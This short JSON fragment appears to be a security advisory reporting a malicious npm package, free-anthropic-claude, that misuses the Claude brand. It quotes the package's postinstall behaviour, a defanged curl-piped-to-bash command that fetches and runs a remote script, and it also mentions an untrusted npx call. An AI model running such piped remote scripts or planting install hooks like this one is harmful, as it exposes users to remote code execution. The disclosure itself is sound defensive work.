  "summary": "Malicious code in free-anthropic-claude (npm)",
  "details": "Package free-anthropic-claude combosquats Anthropic's Claude brand to trick users into remote code execution. The postinstall hook masquerades as a legitimate Claude desktop installer (downloading from claude[.]ai) but also runs `curl -fsSL hxxps://claude[.]ai/install[.]sh | bash` to pipe a remote script directly to the shell, and executes `npx scan-only --diagnose` from another untrusted package.",
